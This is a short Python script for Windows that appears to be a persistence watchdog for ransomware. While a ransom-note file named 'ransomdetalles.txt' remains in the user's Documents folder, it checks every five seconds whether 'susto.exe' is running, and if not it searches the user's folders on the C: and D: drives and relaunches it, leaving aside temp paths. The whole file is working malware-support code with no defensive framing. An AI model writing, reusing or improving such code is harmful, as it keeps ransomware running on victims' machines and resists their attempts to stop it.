import os,getpass,psutil,time
while os.path.exists("C:\\Users\\"+getpass.getuser()+"\\Documents\\ransomdetalles.txt"):
    if not "susto.exe" in (i.name() for i in psutil.process_iter()):
        found=False
        
        for ruta, directorios, archivos in os.walk("C:\\Users\\"+getpass.getuser()):
            for archivo in archivos:
                if archivo=="susto.exe" and not found and "temp" not in ruta.lower():
                    os.startfile(ruta+"\\"+archivo)
                    found=True
                    break
        print("no")
        if not found and os.path.exists("D:\\Users\\"):
            for ruta, directorios, archivos in os.walk("D:\\Users\\"+getpass.getuser()):
                for archivo in archivos:
                    if archivo=="susto.exe" and not found and "temp" not in ruta.lower():
                        os.startfile(ruta+"\\"+archivo)
                        found=True
                        break
        print("tampoco")
    time.sleep(5)